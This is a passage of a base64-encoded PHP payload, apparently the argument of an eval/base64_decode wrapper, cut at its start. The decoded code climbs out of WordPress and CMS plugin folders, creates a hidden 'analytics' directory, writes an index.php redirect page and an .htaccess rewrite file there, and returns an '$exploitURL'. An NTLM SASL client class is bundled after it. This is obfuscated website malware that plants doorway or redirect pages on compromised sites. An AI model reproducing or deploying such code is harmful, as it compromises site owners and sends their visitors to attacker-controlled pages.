JlZGlyZWN0aW9uRGlyID0gcGFyZW50ZGlyKCR1cmwpOw0KICAgICRGaWxlbmFtZSAgICAgICA9ICJpbmRleC5waHAiOw0KICAgICRGb2xkZXIgICAgICAgICA9ICIiOw0KICAgIGlmICgkUmVkaXJlY3Rpb25EaXIgIT0gJEN1cnJlbnRVUkwpIHsNCiAgICAgICAgJEZvbGRlciA9ICIuLi8iOw0KICAgICAgICB3aGlsZSAodHJ1ZSkgew0KICAgICAgICAgICAgaWYgKHByZWdfbWF0Y2goJy8oPzp3cC1jb250ZW50XC9wbHVnaW5zfHdwLWNvbnRlbnRcL3RoZW1lc3x3cC1pbmNsdWRlc3x3cC1hZG1pbnx3cC1jb250ZW50fG1vZHVsZXNcL21vZF93ZGJhbm5lcnN8aW5jbHVkZXNcL3xnb29nbGVfcmVjb21tZW5kc3xtdC1zdGF0aWN8ZGF0YVwvbW9kdWxlKS8nLCBwYXJzZV91cmwoJFJlZGlyZWN0aW9uRGlyLCBQSFBfVVJMX1BBVEgpKSkgew0KICAgICAgICAgICAgICAgICRGb2xkZXIgLj0gIi4uLyI7DQogICAgICAgICAgICAgICAgJFJlZGlyZWN0aW9uRGlyID0gcGFyZW50ZGlyKCRSZWRpcmVjdGlvbkRpcik7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIGlmICghZmlsZV9leGlzdHMoJEZvbGRlciAuICJhbmFseXRpY3MiIC4gUkVESVJFQ1RJT05fRk9MREVSIC4gIi8iIC4gJEZpbGVuYW1lKSkgew0KICAgICAgICBpZiAoIWlzX2RpcigkRm9sZGVyIC4gImFuYWx5dGljcyIgLiBSRURJUkVDVElPTl9GT0xERVIpKSB7DQogICAgICAgICAgICBAbWtkaXIoJEZvbGRlciAuICJhbmFseXRpY3MiIC4gUkVESVJFQ1RJT05fRk9MREVSKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoaXNfZGlyKCRGb2xkZXIgLiAiYW5hbHl0aWNzIiAuIFJFRElSRUNUSU9OX0ZPTERFUikpIHsNCiAgICAgICAgICAgIEBmaWxlX3B1dF9jb250ZW50cygkRm9sZGVyIC4gImFuYWx5dGljcyIgLiBSRURJUkVDVElPTl9GT0xERVIgLiAiLyIgLiAkRmlsZW5hbWUsIFJlZGlyZWN0aW9uRmlsZSgpKTsNCiAgICAgICAgICAgICRDb250ZW50ICAgPSBhcnJheSgpOw0KICAgICAgICAgICAgJENvbnRlbnRbXSA9ICc8SWZNb2R1bGUgbW9kX3Jld3JpdGUuYz4nOw0KICAgICAgICAgICAgJENvbnRlbnRbXSA9ICcJPElmTW9kdWxlIG1vZF9lbnYuYz4nOw0KICAgICAgICAgICAgJENvbnRlbnRbXSA9ICcJCVNldEVudiBIVFRQX01PRF9SRVdSSVRFX1NIRUxMIE9uJzsNCiAgICAgICAgICAgICRDb250ZW50W10gPSAnCTwvSWZNb2R1bGU+JzsNCiAgICAgICAgICAgICRDb250ZW50W10gPSAnUmV3cml0ZUVuZ2luZSBPbic7DQogICAgICAgICAgICAkQ29udGVudFtdID0gJ1Jld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1mJzsNCiAgICAgICAgICAgICRDb250ZW50W10gPSAnUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWwnOw0KICAgICAgICAgICAgJENvbnRlbnRbXSA9ICdSZXdyaXRlQ29uZCAle1JFUVVFU1RfVVJJfSAhLWwnOw0KICAgICAgICAgICAgJENvbnRlbnRbXSA9ICdSZXdyaXRlQ29uZCAle1JFUVVFU1RfRklMRU5BTUV9ICFcLihpY298Y3NzfHBuZ3xqcGd8Z2lmfGpzKSQgW05DXSc7DQogICAgICAgICAgICAkQ29udGVudFtdID0gJ1Jld3JpdGVSdWxlIC4gaW5kZXgucGhwJzsNCiAgICAgICAgICAgICRDb250ZW50W10gPSAnPC9JZk1vZHVsZT4nOw0KICAgICAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRGb2xkZXIgLiAiYW5hbHl0aWNzIiAuIFJFRElSRUNUSU9OX0ZPTERFUiAuICIvLmh0YWNjZXNzIiwgaW1wbG9kZShQSFBfRU9MLCAkQ29udGVudCkpOw0KICAgICAgICB9DQogICAgfQ0KICAgIGlmICghZmlsZV9leGlzdHMoJEZvbGRlciAuICJhbmFseXRpY3MiIC4gUkVESVJFQ1RJT05fRk9MREVSIC4gIi8iIC4gJEZpbGVuYW1lKSkgew0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KICAgIGlmICghaXNSZXdyaXRlT04oKSkgew0KICAgICAgICAkZXhwbG9pdFVSTCA9ICRSZWRpcmVjdGlvbkRpciAuICJhbmFseXRpY3MiIC4gUkVESVJFQ1RJT05fRk9MREVSIC4gIi8/cmV3cml0ZT0iOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRleHBsb2l0VVJMID0gJFJlZGlyZWN0aW9uRGlyIC4gImFuYWx5dGljcyIgLiBSRURJUkVDVElPTl9GT0xERVIgLiAiLyI7DQogICAgfQ0KICAgIHJldHVybiAkZXhwbG9pdFVSTDsNCn0NCmRlZmluZSgiU0FTTF9OVExNX1NUQVRFX1NUQVJUIiwgMCk7DQpkZWZpbmUoIlNBU0xfTlRMTV9TVEFURV9JREVOVElGWV9ET01BSU4iLCAxKTsNCmRlZmluZSgiU0FTTF9OVExNX1NUQVRFX1JFU1BPTkRfQ0hBTExFTkdFIiwgMik7DQpkZWZpbmUoIlNBU0xfTlRMTV9TVEFURV9ET05FIiwgMyk7DQpkZWZpbmUoIlNBU0xfRkFJTCIsIC0xKTsNCmRlZmluZSgiU0FTTF9DT05USU5VRSIsIDEpOw0KDQpjbGFzcyBudGxtX3Nhc2xfY2xpZW50X2NsYXNzDQp7DQogICAgcHVibGljICRjcmVkZW50aWFscyA9IGFycmF5KCk7DQogICAgcHVibGljICRzdGF0ZSA9IFNBU0xfTlRMTV9TVEFURV9TVEFSVDsNCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBpbml0aWFsaXplKCYkY2xpZW50KQ0KICAgIHsNCiAgICAgICAgaWYgKCFmdW5jdGlvbl9leGlzdHMoJGZ1bmN0aW9uID0gIm1jcnlwdF9lbmNyeXB0IikNCiAgICAgICAgICAgIHx8ICFmdW5jdGlvbl9leGlzdHMoJGZ1bmN0aW9uID0gIm1oYXNoIikNCiAgICAgICAgKSB7DQogICAgICAgICAgICAkZXh0ZW5zaW9ucyA9IGFycmF5KA0KICAgICAgICAgICAgICAgICJtY3J5cHRfZW5jcnlwdCIgPT4gIm1jcnlwdCIsDQogICAgICAgICAgICAgICAgIm1oYXNoIiA9PiAibWhhc2giDQogICAgICAgICAgICApOw0KICAgICAgICAgICAgJGNsaWVudC0+ZXJyb3IgPSAidGhlIGV4dGVuc2lvbiAiIC4gJGV4dGVuc2lvbnNbJGZ1bmN0aW9uXSAuDQogICAgICAgICAgICAgICAgIiByZXF1aXJlZCBieSB0aGUgTlRMTSBTQVNMIGNsaWVudCBjbGFzcyBpcyBub3QgYXZhaWxhYmxlIGluIHRoaXMgUEhQIGNvbmZpZ3VyYXRpb24iOw0KICAgICAgICAgICAgcmV0dXJuICgwKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gKDEpOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiBBU0NJSVRvVW5pY29kZSgkYXNjaWkpDQogICAgew0KICAgICAgICBmb3IgKCR1bmljb2RlID0gIiIsICRhID0gMDsgJGEgPCBzdHJsZW4oJGFzY2lpKTsgJGErKykgew0KICAgICAgICAgICAgJHVuaWNvZGUgLj0gc3Vic3RyKCRhc2NpaSwgJGEsIDEpIC4gY2hyKDApOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAoJHVuaWNvZGUpOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiB0eXBlTXNnMSgkZG9tYWluLCAkd29ya3N0YXRpb24pDQogICAgew0KICAgICAgICAkZG9tYWluX2xlbmd0aCA9IHN0cmxlbigkZG9tYWluKTsNCiAgICAgICAgJHdvcmtzdGF0aW9uX2xlbmd0aCA9IHN0cmxlbigkd29ya3N0YXRpb24pOw0KICAgICAgICAkd29ya3N0YXRpb25fb2Zmc2V0ID0gMzI7DQogICAgICAgICRkb21haW5fb2Zmc2V0ID0gJHdvcmtzdGF0aW9uX29mZnNldCArICR3b3Jrc3RhdGlvbl9sZW5ndGg7DQogICAgICAgIHJldHVybiAoDQogICAgICAgICAgICAiTlRMTVNTUFwwIiAuDQogICAgICAgICAgICAiXHgwMVx4MDBceDAwXHgwMCIgLg0KICAgICAgICAgICAgIlx4MDdceDMyXHgwMFx4MDAiIC4NCiAgICAgICAgICAgIHBhY2soInYiLCAkZG9tYWluX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICRkb21haW5fbGVuZ3RoKSAuDQogICAgICAgICAgICBwYWNrKCJWIiwgJGRvbWFpbl9vZmZzZXQpIC4NCiAgICAgICAgICAgIHBhY2soInYiLCAkd29ya3N0YXRpb25fbGVuZ3RoKSAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJHdvcmtzdGF0aW9uX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygiViIsICR3b3Jrc3RhdGlvbl9vZmZzZXQpIC4NCiAgICAgICAgICAgICR3b3Jrc3RhdGlvbiAuDQogICAgICAgICAgICAkZG9tYWluDQogICAgICAgICk7DQogICAgfQ0KDQogICAgcHVibGljIGZ1bmN0aW9uIE5UTE1SZXNwb25zZSgkY2hhbGxlbmdlLCAkcGFzc3dvcmQpDQogICAgew0KICAgICAgICAkdW5pY29kZSA9ICR0aGlzLT5BU0NJSVRvVW5pY29kZSgkcGFzc3dvcmQpOw0KICAgICAgICAkbWQ0ID0gbWhhc2goTUhBU0hfTUQ0LCAkdW5pY29kZSk7DQogICAgICAgICRwYWRkZWQgPSAkbWQ0IC4gc3RyX3JlcGVhdChjaHIoMCksIDIxIC0gc3RybGVuKCRtZDQpKTsNCiAgICAgICAgJGl2X3NpemUgPSBtY3J5cHRfZ2V0X2l2X3NpemUoTUNSWVBUX0RFUywgTUNSWVBUX01PREVfRUNCKTsNCiAgICAgICAgJGl2ID0gbWNyeXB0X2NyZWF0ZV9pdigkaXZfc2l6ZSwgTUNSWVBUX1JBTkQpOw0KICAgICAgICBmb3IgKCRyZXNwb25zZSA9ICIiLCAkdGhpcmQgPSAwOyAkdGhpcmQgPCAyMTsgJHRoaXJkICs9IDcpIHsNCiAgICAgICAgICAgIGZvciAoJHBhY2tlZCA9ICIiLCAkcCA9ICR0aGlyZDsgJHAgPCAkdGhpcmQgKyA3OyAkcCsrKSB7DQogICAgICAgICAgICAgICAgJHBhY2tlZCAuPSBzdHJfcGFkKGRlY2JpbihvcmQoc3Vic3RyKCRwYWRkZWQsICRwLCAxKSkpLCA4LCAiMCIsIFNUUl9QQURfTEVGVCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBmb3IgKCRrZXkgPSAiIiwgJHAgPSAwOyAkcCA8IHN0cmxlbigkcGFja2VkKTsgJHAgKz0gNykgew0KICAgICAgICAgICAgICAgICRzID0gc3Vic3RyKCRwYWNrZWQsICRwLCA3KTsNCiAgICAgICAgICAgICAgICAkYiA9ICRzIC4gKChzdWJzdHJfY291bnQoJHMsICIxIikgJSAyKSA/ICIwIiA6ICIxIik7DQogICAgICAgICAgICAgICAgJGtleSAuPSBjaHIoYmluZGVjKCRiKSk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkY2lwaGVydGV4dCA9IG1jcnlwdF9lbmNyeXB0KE1DUllQVF9ERVMsICRrZXksICRjaGFsbGVuZ2UsIE1DUllQVF9NT0RFX0VDQiwgJGl2KTsNCiAgICAgICAgICAgICRyZXNwb25zZSAuPSAkY2lwaGVydGV4dDsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJHJlc3BvbnNlOw0KICAgIH0NCg0KICAgIHB1YmxpYyBmdW5jdGlvbiB0eXBlTXNnMygkbnRsbV9yZXNwb25zZSwgJHVzZXIsICRkb21haW4sICR3b3Jrc3RhdGlvbikNCiAgICB7DQogICAgICAgICRkb21haW5fdW5pY29kZSA9ICR0aGlzLT5BU0NJSVRvVW5pY29kZSgkZG9tYWluKTsNCiAgICAgICAgJGRvbWFpbl9sZW5ndGggPSBzdHJsZW4oJGRvbWFpbl91bmljb2RlKTsNCiAgICAgICAgJGRvbWFpbl9vZmZzZXQgPSA2NDsNCiAgICAgICAgJHVzZXJfdW5pY29kZSA9ICR0aGlzLT5BU0NJSVRvVW5pY29kZSgkdXNlcik7DQogICAgICAgICR1c2VyX2xlbmd0aCA9IHN0cmxlbigkdXNlcl91bmljb2RlKTsNCiAgICAgICAgJHVzZXJfb2Zmc2V0ID0gJGRvbWFpbl9vZmZzZXQgKyAkZG9tYWluX2xlbmd0aDsNCiAgICAgICAgJHdvcmtzdGF0aW9uX3VuaWNvZGUgPSAkdGhpcy0+QVNDSUlUb1VuaWNvZGUoJHdvcmtzdGF0aW9uKTsNCiAgICAgICAgJHdvcmtzdGF0aW9uX2xlbmd0aCA9IHN0cmxlbigkd29ya3N0YXRpb25fdW5pY29kZSk7DQogICAgICAgICR3b3Jrc3RhdGlvbl9vZmZzZXQgPSAkdXNlcl9vZmZzZXQgKyAkdXNlcl9sZW5ndGg7DQogICAgICAgICRsbSA9ICIiOw0KICAgICAgICAkbG1fbGVuZ3RoID0gc3RybGVuKCRsbSk7DQogICAgICAgICRsbV9vZmZzZXQgPSAkd29ya3N0YXRpb25fb2Zmc2V0ICsgJHdvcmtzdGF0aW9uX2xlbmd0aDsNCiAgICAgICAgJG50bG0gPSAkbnRsbV9yZXNwb25zZTsNCiAgICAgICAgJG50bG1fbGVuZ3RoID0gc3RybGVuKCRudGxtKTsNCiAgICAgICAgJG50bG1fb2Zmc2V0ID0gJGxtX29mZnNldCArICRsbV9sZW5ndGg7DQogICAgICAgICRzZXNzaW9uID0gIiI7DQogICAgICAgICRzZXNzaW9uX2xlbmd0aCA9IHN0cmxlbigkc2Vzc2lvbik7DQogICAgICAgICRzZXNzaW9uX29mZnNldCA9ICRudGxtX29mZnNldCArICRudGxtX2xlbmd0aDsNCiAgICAgICAgcmV0dXJuICgNCiAgICAgICAgICAgICJOVExNU1NQXDAiIC4NCiAgICAgICAgICAgICJceDAzXHgwMFx4MDBceDAwIiAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJGxtX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICRsbV9sZW5ndGgpIC4NCiAgICAgICAgICAgIHBhY2soIlYiLCAkbG1fb2Zmc2V0KSAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJG50bG1fbGVuZ3RoKSAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJG50bG1fbGVuZ3RoKSAuDQogICAgICAgICAgICBwYWNrKCJWIiwgJG50bG1fb2Zmc2V0KSAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJGRvbWFpbl9sZW5ndGgpIC4NCiAgICAgICAgICAgIHBhY2soInYiLCAkZG9tYWluX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygiViIsICRkb21haW5fb2Zmc2V0KSAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJHVzZXJfbGVuZ3RoKSAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJHVzZXJfbGVuZ3RoKSAuDQogICAgICAgICAgICBwYWNrKCJWIiwgJHVzZXJfb2Zmc2V0KSAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJHdvcmtzdGF0aW9uX2xlbmd0aCkgLg0KICAgICAgICAgICAgcGFjaygidiIsICR3b3Jrc3RhdGlvbl9sZW5ndGgpIC4NCiAgICAgICAgICAgIHBhY2soIlYiLCAkd29ya3N0YXRpb25fb2Zmc2V0KSAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJHNlc3Npb25fbGVuZ3RoKSAuDQogICAgICAgICAgICBwYWNrKCJ2IiwgJHNlc3Npb25fbGVuZ3RoKSAuDQogICAgICAgICAgICBwYWNrKCJWIiwgJHNlc3Npb25fb2Zmc2V0KSAuDQogICAgICAgICAgICAiXHgwMVx4MDJceDAwXHgwMCIgLg0KICAgICAgICAgICAgJGRvbWFpbl91bmljb2RlIC4NCiAgICAgICAgICAgICR1c2VyX3VuaWNvZGUgLg0KICAgICAgICAgICAgJHdvcmtzdGF0aW9uX3VuaWNvZGUgLg0KICAgICAgICAgICAgJGxtIC4NCiAgICAgICAgICAgICRudGxtDQogICAgICAgICk7DQogICAgfQ0KDQogICAgcHVibGljIGZ1bmN0aW9uIHN0YXJ0KCYkY2xpZW50LCAmJG1lc3NhZ2UsICYkaW50ZXJhY3Rpb25zKQ0KICAgIHsNCiAgICAgICAgaWYgKCR0aGlzLT5zdGF0ZSAhPSBTQVNMX05UTE1fU1RBVEVfU1RBUlQpIHsNCiAgICAgICAgICAgICRjbGllbnQtPmVycm9yID0gIk5UTE0gYXV0aGVudGljYXRpb24gc3RhdGUgaXMgbm90IGF0IHRoZSBzdGFydCI7DQogICAgICAgICAgICByZXR1cm4gKFNBU0xfRkFJTCk7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPmNyZWRlbnRpYWxzID0gYXJyYXkoDQogICAgICAgICAgICAidXNlciIgPT4gIiIsDQogICAgICAgICAgICAicGFzc3dvcmQiID0+ICIiLA0KICAgICAgICAgICAgInJlYWxtIiA9PiAiIiwNCiAgICAgICAgICAgICJ3b3Jrc3RhdGlvbiIgPT4gIiINCiAgICAgICAgKTsNCiAgICAgICAgJGRlZmF1bHRzID0gYXJyYXkoKTsNCiAgICAgICAgJHN0YXR1cyA9ICRjbGllbnQtPkdldENyZWRlbnRpYWxzKCR0aGlzLT5jcmVkZW50aWFscywgJGRlZmF1bHRzLCAkaW50ZXJhY3Rpb25zKTsNCiAgICAgICAgaWYgKCRzdGF0dXMgPT0gU0FTTF9DT05USU5VRSkgew0KICAgICAgICAgICAgJHRoaXMtPnN0YXRlID0gU0FTTF9OVExNX1NUQVRFX0lERU5USUZZX0RPTUFJTjsNCiAgICAgICAgfQ0KICAgICAgICB1bnNldCgkbWVzc2FnZSk7DQogICAgICAgIHJldHVybiAoJHN0YXR1cyk7DQogICAgfQ0KDQogICAgcHVibGljIGZ1bmN0aW9uIHN0ZXAoJiRjbGllbnQsICRyZXNwb25zZSwgJiRtZXNzYWdlLCAmJGludGVyYWN0aW9ucykNCiAgICB7DQogICAgICAgIHN3aXRjaCAoJHRoaXMtPnN0YXRlKSB7DQogICAgICAgICAgICBjYXNlIFNBU0xfTlRMTV9TVEFURV9JREVOVElGWV9ET01BSU46DQogICAgICAgICAgICAgICAgJG1lc3NhZ2UgPSAkdGhpcy0+dHlwZU1zZzEoJHRoaXMtPmNyZWRlbnRpYWxzWyJyZWFsbSJdLCAkdGhpcy0+Y3JlZGVudGlhbHNbIndvcmtzdGF0aW9uIl0pOw0KICAgICAgICAgICAgICAgICR0aGlzLT5zdGF0ZSA9IFNBU0xfTlRMTV9TVEFURV9SRVNQT05EX0NIQUxMRU5HRTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgU0FTTF9OVExNX1NUQVRFX1JFU1BPTkRfQ0hBTExFTkdFOg0KICAgICAgICAgICAgICAgICRudGxtX3Jlc3BvbnNlID0gJHRoaXMtPk5UTE1SZXNwb25zZShzdWJzdHIoJHJlc3BvbnNlLCAyNCwgOCksICR0aGlzLT5jcmVkZW50aWFsc1sicGFzc3dvcmQiXSk7DQogICAgICAgICAgICAgICAgJG1lc3NhZ2UgPSAkdGhpcy0+dHlwZU1zZzMoDQogICAgICAgICAgICAgICAgICAgICRudGxtX3Jlc3BvbnNlLA0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Y3JlZGVudGlhbHNbInVzZXIiXSwNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmNyZWRlbnRpYWxzWyJyZWFsbSJdLA0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+Y3JlZGVudGlhbHNbIndvcmtzdGF0aW9uIl0NCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgICR0aGlzLT5zdGF0ZSA9IFNBU0xfTlRMTV9TVEFURV9ET05FOw0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSBTQVNMX05UTE1fU1RBVEVfRE9ORToNCiAgICAgICAgICAgICAgICAkY2xpZW50LT5lcnJvciA9ICJOVExNIGF1dGhlbnRpY2F0aW9uIHdhcyBmaW5pc2hlZCB3aXRob3V0IHN1Y2Nlc3MiOw0KICAgICAgICAgICAgICAgIHJldHVybiAoU0FTTF9GQUlMKTsNCiAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgJGNsaWVudC0+ZXJyb3IgPSAiaW52YWxpZCBOVExNIGF1dGhlbnRpY2F0aW9uIHN0ZXAgc3RhdGUiOw0KICAgICAgICAgICAgICAgIHJldHVybiAoU0FTTF9GQUlMKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gKFNBU0xfQ09OVElOVUUpOw0KICAgIH0NCn0NCg=="));
